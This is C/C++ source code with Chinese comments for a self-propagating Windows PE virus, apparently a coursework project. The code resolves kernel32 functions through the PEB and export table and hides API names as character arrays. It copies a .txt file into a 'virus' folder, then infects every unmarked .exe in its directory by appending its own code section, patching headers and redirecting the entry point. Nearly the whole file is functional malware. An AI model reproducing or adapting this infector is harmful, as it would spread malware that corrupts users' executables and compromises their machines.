#include "shellcode.h"

#pragma section(".code", execute, read) // 声明code段
#pragma section(".code1", execute, read) // 声明code1段
//#pragma section(".codedata", read, write)
//#pragma comment(linker,"/SECTION:.dat,RWE") //修改节属性
//#pragma comment(linker,"/SECTION:.shell,RWE")
//#pragma comment(linker,"/MERGE:.dat=.shell")//两节合并到.shell节
//#pragma data_seg(".codedata")
//#pragma const_seg(".codedata")

//#pragma comment(linker,"/SECTION:.codedata,ERW")

#pragma code_seg(".code")
int shellcode()
{	
	// ImageBase
	LPVOID ImageBase = GetModuleBase(NULL);
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ImageBase;
	DWORD old_entry = *(DWORD*)(DWORD(ImageBase) + dos_header->e_lfanew - sizeof(DWORD)); // 读取旧entry point
    old_entry += (DWORD)ImageBase; // 返回点

	func f = init_function(); // 初始化所有函数

	// 实现复制功能
	// 获取当前路径
    WCHAR dest[255];
    f.memset(dest, 0, 255 * sizeof(WCHAR));
	int bytes = f.GetModuleFileNameW(NULL, dest, 255); 
	while (dest[bytes] != '\\') // 去掉程序名字
	{
		dest[bytes] = 0;
		bytes--;
	}

	// 寻找第一个txt
	WCHAR txt[6] = { L'*', L'.',L't',L'x',L't',0 };
	f.wmemcpy_s(dest + bytes+1, 255, txt, 6);
	WIN32_FIND_DATA FindFileData;

	HANDLE hFind = f.FindFirstFileW(dest, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
        WCHAR copy_dest[255];
        f.memset(copy_dest, 0, 255 * sizeof(WCHAR));
		WCHAR folder[] = {L'v',L'i',L'r',L'u',L's',0};
		WCHAR name[] = { L'\\',L'2',L'0',L'2',L'0',L'3',L'0',L'2',L'0',L'5',L'1',L'1',L'6',L'4',L'.',L't',L'x',L't',0};
		// 新建文件夹
		f.wmemcpy_s(copy_dest, 255, dest, bytes+1);
		f.wmemcpy_s(copy_dest + bytes+1,255, folder, 6);
		f.CreateDirectoryW(copy_dest, NULL);
		// 复制文件
		f.wmemcpy_s(dest + bytes + 1, 255, FindFileData.cFileName, f.lstrlenW(FindFileData.cFileName));
		f.wmemcpy_s(copy_dest + bytes + 6,255, name, 19);
		BOOL r = f.CopyFileW(dest, copy_dest, FALSE);
	} 
	f.FindClose(hFind); //关闭句柄

	// 重复感染
	// 寻找当前目录下所有exe文件
    WCHAR exe[] = { L'*', L'.',L'e',L'x',L'e',0 };
	f.memset(dest + bytes + 1, 0, (254 - bytes) * sizeof(WCHAR));
	f.wmemcpy_s(dest + bytes + 1, 255, exe, 6);
    hFind = f.FindFirstFileW(dest, &FindFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
		// 感染
		f.wmemcpy_s(dest + bytes + 1, 255, FindFileData.cFileName, f.lstrlenW(FindFileData.cFileName));
        infect(dest, f);
        while (f.FindNextFileW(hFind, &FindFileData)) {
			f.memset(dest + bytes + 1, 0, (254 - bytes) * sizeof(WCHAR));
			f.wmemcpy_s(dest + bytes + 1, 255, FindFileData.cFileName, f.lstrlenW(FindFileData.cFileName));
            infect(dest, f);
        }
    }

	// 运行正常功能
	__asm
	{
		jmp old_entry;
	}
	return 0;
}
#pragma comment(linker,"/SECTION:.code,ERW")

#pragma code_seg(".code1")
// 获取所有需要函数的指针
func init_function()
{
	func f;
	WCHAR kernel[13] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
	// 获取kernel32.dll地址
	LPVOID KernelBase = GetModuleBase(kernel);
	// 获取GetProcAddress地址
	f.GetProcAddress = (_GetProcAddress)(getAddressOfGetProcAddr(KernelBase));

	char find_first_file[15] = { 'F', 'i', 'n', 'd', 'F', 'i', 'r', 's', 't', 'F', 'i', 'l', 'e', 'W', 0 };
	f.FindFirstFileW = (_FindFirstFile)f.GetProcAddress(HMODULE(DWORD(KernelBase)), find_first_file);

	char find_next_file[14] = { 'F', 'i', 'n', 'd', 'N', 'e', 'x', 't', 'F', 'i', 'l', 'e', 'W', 0 };
	f.FindNextFileW = (_FindNextFileW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), find_next_file);

	char find_close[10] = { 'F', 'i', 'n', 'd', 'C', 'l', 'o', 's', 'e', 0 };
	f.FindClose = (_FindClose)f.GetProcAddress(HMODULE(DWORD(KernelBase)), find_close);

	char get_module_file_name[19] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'W', 0 };
	f.GetModuleFileNameW = (_GetModuleFileNameW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), get_module_file_name);

	char create_directory[17] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'W', 0 };
	f.CreateDirectoryW = (_CreateDirectoryW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), create_directory);
	char copy_file[10] = { 'C', 'o', 'p', 'y', 'F', 'i', 'l', 'e', 'W', 0 };
	f.CopyFileW = (_CopyFileW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), copy_file);
	char lstrlw[9] = { 'l', 's', 't', 'r', 'l', 'e', 'n', 'W', 0 };
	f.lstrlenW = (_lstrlenW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), lstrlw);
	char load_library[13] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	f.LoadLibraryA = (_LoadLibraryA)f.GetProcAddress(HMODULE(DWORD(KernelBase)), load_library);

	char crt[14] = { 'u', 'c', 'r', 't', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l',0 };
	HMODULE CrtBase = f.LoadLibraryA(crt);
	char wmem[] = { 'w','m','e','m','c','p','y','_','s',0 };
	f.wmemcpy_s = (_wmemcpy_s)f.GetProcAddress(CrtBase, wmem);

	char vcrt[] = { 'v','c','r','u','n','t','i','m','e','1','4','0','.','d','l','l',0 };
	HMODULE VcrtBase = f.LoadLibraryA(vcrt);
	char memst[] = { 'm','e','m','s','e','t',0 };
	f.memset = (_memset)f.GetProcAddress(VcrtBase, memst);

	char memcp[] = { 'm','e','m','c','p','y',0 };
	f.memcpy = (_memcpy)f.GetProcAddress(CrtBase, memcp);

	char close_handle[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
	f.CloseHandle = (_CloseHandle)f.GetProcAddress(HMODULE(DWORD(KernelBase)), close_handle);

	char fre[] = { 'f','r','e','e',0 };
	f.free = (_free)f.GetProcAddress(CrtBase, fre);

	char maloc[] = { 'm','a','l','l','o','c',0 };
	f.malloc = (_malloc)f.GetProcAddress(CrtBase, maloc);

	char create_file[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0};
	f.CreateFileW = (_CreateFileW)f.GetProcAddress(HMODULE(DWORD(KernelBase)), create_file);

	char set_file[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0};
	f.SetFilePointer = (_SetFilePointer)f.GetProcAddress(HMODULE(DWORD(KernelBase)), set_file);

	char read_file[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0 };
	f.ReadFile = (_ReadFile)f.GetProcAddress(HMODULE(DWORD(KernelBase)), read_file);

	char write_file[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0};
	f.WriteFile = (_WriteFile)f.GetProcAddress(HMODULE(DWORD(KernelBase)), write_file);
	return f;
}

// 将src处size个字节数据复制到offset处
__forceinline BOOL setBytes(BYTE* src, size_t size, long offset, HANDLE hFile, func f)
{
	f.SetFilePointer(hFile, offset, 0, 0);
	DWORD written = 0;
	BOOL r = f.WriteFile(hFile, src, size, &written, NULL);
	if (!(r && written == size))
	{
		return false;
	}
	return true;
}

// 将offset处size个字节数据复制到dest里
__forceinline BOOL getBytes(BYTE* dst, size_t size, long offset, HANDLE hFile, func f)
{
	f.SetFilePointer(hFile, offset, 0, 0);
	DWORD read = 0;
	BOOL r = f.ReadFile(hFile, dst, size, &read, NULL);
	if (!(r && read == size))
	{
		return false;
	}
	return true;
}

// 初始化文件信息
__forceinline PE init_file(WCHAR* filename, func f)
{
	PE p;
	HANDLE hFile = f.CreateFileW(
		filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// 文件无法打开
		p.status = FILE_FAILURE;
		return p;
	}
	p.hFile = hFile;


	// 判断文件是否已感染

	// DOS Header
	IMAGE_DOS_HEADER dos_header = get_IMAGE_DOS_HEADER(hFile, f);
	p.e_lfanew = dos_header.e_lfanew;
	_IMAGE_NT_HEADERS nt_header = get_IMAGE_NT_HEADER(hFile, p, f);

	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
	{
		f.CloseHandle(hFile);
		p.status = FILE_FAILURE;
		return p;
	}
	if (nt_header.Signature != IMAGE_NT_SIGNATURE)
	{
		f.CloseHandle(hFile);
		p.status = FILE_FAILURE;
		return p;
	}
	DWORD infectSignature = 0;
	getBytes((BYTE*)&infectSignature, sizeof(DWORD), p.e_lfanew - sizeof(DWORD), hFile, f);
	if (infectSignature != 0)
	{
		f.CloseHandle(hFile);
		p.status = IS_INFECTED;
		return p;
	}

	// 未感染
	p.status = IS_NOT_INFECTED;

	// Optional Header
	p.number_of_sections = nt_header.FileHeader.NumberOfSections;
	IMAGE_OPTIONAL_HEADER32 optional_header = nt_header.OptionalHeader;
	p.AddressOfEntry = optional_header.AddressOfEntryPoint;
	p.ImageBase = optional_header.ImageBase;
	p.FileAlignment = optional_header.FileAlignment;
	p.SectionAlignment = optional_header.SectionAlignment;
	p.SizeOfImage = optional_header.SizeOfImage;

	get_IMAGE_SECTION_HEADERS(&p.section_headers, p.number_of_sections, p.e_lfanew, hFile, f);

	return p;
}

// 得到DOS头
__forceinline IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(HANDLE hFile, func f)
{
	char* buf = (char*)f.malloc(sizeof(IMAGE_DOS_HEADER));
	f.memset(buf, 0, sizeof(IMAGE_DOS_HEADER));
	getBytes((BYTE*)buf, sizeof(IMAGE_DOS_HEADER), 0, hFile, f);
	return (IMAGE_DOS_HEADER) * ((IMAGE_DOS_HEADER*)buf);
}

// 得到NT头
__forceinline _IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(HANDLE hFile, PE p, func f)
{
	char* buf = (char*)f.malloc(sizeof(_IMAGE_NT_HEADERS));
	f.memset(buf, 0, sizeof(_IMAGE_NT_HEADERS));
	getBytes((BYTE*)buf, sizeof(_IMAGE_NT_HEADERS), p.e_lfanew, hFile, f);
	return (_IMAGE_NT_HEADERS) * ((_IMAGE_NT_HEADERS*)buf);
}

// 得到SectionHeader
__forceinline void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER** dst, int cnt, LONG e_lfanew, HANDLE hFile, func f)
{
	_IMAGE_SECTION_HEADER* header = (IMAGE_SECTION_HEADER*)f.malloc(sizeof(IMAGE_SECTION_HEADER) * cnt);
	long  offset = e_lfanew + sizeof(_IMAGE_NT_HEADERS);
	getBytes((BYTE*)header, sizeof(IMAGE_SECTION_HEADER) * cnt, offset, hFile, f);
	*dst = header;
	return;
}

// 感染文件
void infect(WCHAR* filename, func f)
//目标文件必须是未感染的exe文件感染代码
{
	PE p = init_file(filename, f);
	if (p.status != IS_NOT_INFECTED)
	{
		return;
	}

	// 
	LPVOID ImageBase = GetModuleBase(NULL); // 获取自身ImageBase
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(dos_header->e_lfanew + DWORD(ImageBase));
	PIMAGE_SECTION_HEADER sec_header = NULL;
	int cnt = nt_header->FileHeader.NumberOfSections; // 自身Section数目
	char shell[] = { '.','c','o','d','e', 0};

	int i = 0;
	for (i = 0; i < cnt; i++)
	{
		// 依次搜索自身section header
		sec_header = (PIMAGE_SECTION_HEADER)(dos_header->e_lfanew + sizeof(*nt_header) + DWORD(ImageBase) + sizeof(*sec_header) * i); 
		if (cmp((char*)(sec_header->Name), shell)) // shellcode直接保存在内存中
		{
			break; // 定位到shell段
		}
	}

	IMAGE_SECTION_HEADER new_header; // 新shell对应内容
	f.memcpy(&new_header, sec_header, sizeof(*sec_header)); // 复制内容

	// 定位到目标文件节表的最后一个位置的文件偏移 fa和rva
	int sectionCnt = p.number_of_sections;
	// 文件偏移自然对齐
	DWORD newSection_fa = p.section_headers[sectionCnt - 1].PointerToRawData + p.section_headers[sectionCnt - 1].SizeOfRawData;
	DWORD newSection_rva = p.section_headers[sectionCnt - 1].VirtualAddress + p.section_headers[sectionCnt - 1].SizeOfRawData;

	// 对齐节偏移
	if (newSection_rva % p.SectionAlignment != 0)
	{
		newSection_rva = ((newSection_rva / p.SectionAlignment) + 1) * p.SectionAlignment;
	}

	new_header.VirtualAddress = newSection_rva;
	new_header.PointerToRawData = newSection_fa;
	DWORD size = new_header.SizeOfRawData;

	BOOL r;
	//写入旧entrypoint 同时也是感染标识
	r = setBytes((BYTE*)&p.AddressOfEntry, sizeof(DWORD), p.e_lfanew - sizeof(DWORD), p.hFile, f);

	// 增加sec_no
	WORD sec_no = p.number_of_sections + 1;
	r = setBytes((BYTE*)&sec_no, sizeof(WORD), p.e_lfanew + sizeof(WORD) * 3, p.hFile, f);

	// 修改ImageSize
	DWORD image_size = p.SizeOfImage + new_header.SizeOfRawData;
	r = setBytes((BYTE*)&image_size, sizeof(DWORD), p.e_lfanew + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER) + sizeof(DWORD) * 8 + sizeof(WORD) * 12, p.hFile, f);

	// 写入新的section header
	new_header.Characteristics = 0xE00000E0; // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	r = setBytes((BYTE*)&new_header, sizeof(new_header), p.e_lfanew + sizeof(*nt_header) + sizeof(new_header) * sectionCnt, p.hFile, f);

	// 写入新的section
	// 先写实际有用的大小
	BYTE* shell_code = (BYTE*)(sec_header->VirtualAddress + DWORD(ImageBase)); // 读取运行程序内存
	r = setBytes(shell_code, new_header.Misc.VirtualSize, new_header.PointerToRawData, p.hFile, f);

	// 再补齐最后的0
	BYTE zeros[512];
	f.memset(zeros, 0, sizeof(BYTE) * 512);
	r = setBytes(zeros, new_header.SizeOfRawData - new_header.Misc.VirtualSize, new_header.PointerToRawData + new_header.Misc.VirtualSize, p.hFile, f);

	// 修改entrypoint
	DWORD new_entry = new_header.VirtualAddress;
	r = setBytes((BYTE*)&(new_entry), sizeof(DWORD), p.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD) +
		sizeof(BYTE) +
		sizeof(BYTE) +
		sizeof(DWORD) * 3, p.hFile, f); // 写入AddressEntryPoint

	// 善后
	f.CloseHandle(p.hFile);
	f.free(p.section_headers);

	return;
}

// Wchar比较
__forceinline BOOL wcmp(WCHAR* str1, WCHAR* str2)
{
    int cnt = 0;
    while (str1[cnt] != '\0' || str2[cnt] != '\0')
    {
        if (!(str1[cnt] - str2[cnt] == 0 || str1[cnt] - str2[cnt] == 0x20 || str2[cnt] - str1[cnt] == 0x20))
        {
            return false;
        }
        cnt++;
    }
    if (str1[cnt] != '\0' || str2[cnt] != '\0')
        return false;
    return true;
}

// char比较
__forceinline BOOL cmp(char* str1, char* str2)
{
    int cnt = 0;
    while (str1[cnt] != '\0' || str2[cnt] != '\0')
    {
        if (!(str1[cnt] - str2[cnt] == 0 || str1[cnt] - str2[cnt] == 0x20 || str2[cnt] - str1[cnt] == 0x20))
        {
            return false;
        }
        cnt++;
    }
    if (str1[cnt] != '\0' || str2[cnt] != '\0')
        return false;
    return true;
}

// 获取指定DLL地址
__forceinline LPVOID GetModuleBase(WCHAR* pPeName)
{
	PEB* peb = (PPEB)__readfsdword(0x30);

    PEB_LDR_DATA* ldr = peb->Ldr;
	// List_entry头的Flink对应第一项
    LIST_ENTRY* entry = ldr->InMemoryOrderModuleList.Flink;
    LDR_DATA_TABLE_ENTRY* p = NULL;
    while (entry != &(ldr->InMemoryOrderModuleList)) // 最后一项的Flink指向头
    {
        p = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); // 得到对应LDR_DATA
        if (pPeName == NULL || wcmp(pPeName, p->BaseDllName.Buffer)) // NULL 代表获取自身ImageBase
        {
            break;
        }
        ///_tprintf(TEXT("%ws %d\n"), p->FullDllName.Buffer, (DWORD) p->DllBase);
        entry = entry->Flink; //List_entry成员的Flink对应下一项
    }

    return LPVOID(p->DllBase);
}

// 获取GetProcAddr地址
__forceinline LPVOID getAddressOfGetProcAddr(LPVOID KernelBase)
{
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)KernelBase;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((DWORD)KernelBase + dos_header->e_lfanew);
    IMAGE_OPTIONAL_HEADER op_header = nt_header->OptionalHeader;
    DWORD rva = op_header.DataDirectory[0].VirtualAddress;

    DWORD va = rva + DWORD(KernelBase);

    PIMAGE_EXPORT_DIRECTORY export_table = (PIMAGE_EXPORT_DIRECTORY)va;

    DWORD* AddressOfNames = (DWORD*)(export_table->AddressOfNames + DWORD(KernelBase));
    DWORD* AddressOfFunctions = (DWORD*)(export_table->AddressOfFunctions + DWORD(KernelBase));
    WORD* AddressOfNameOrdinals = (WORD*)(export_table->AddressOfNameOrdinals + DWORD(KernelBase));
    char proc[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
    int i = 0;
    for (i = 0; DWORD(i) < export_table->NumberOfNames; i++)
    {
        if (cmp((char*)(AddressOfNames[i] + DWORD(KernelBase)), proc))
        {
            break;
        }
    }
    return LPVOID(AddressOfFunctions[AddressOfNameOrdinals[i]] + DWORD(KernelBase));
}

#pragma comment(linker,"/SECTION:.code1,ERW")
#pragma comment(linker,"/MERGE:.code1=.code") // 保证shellcode在最前面
//#pragma comment(linker, "/MERGE:.codedata=.code") // 把全局变量也放进code段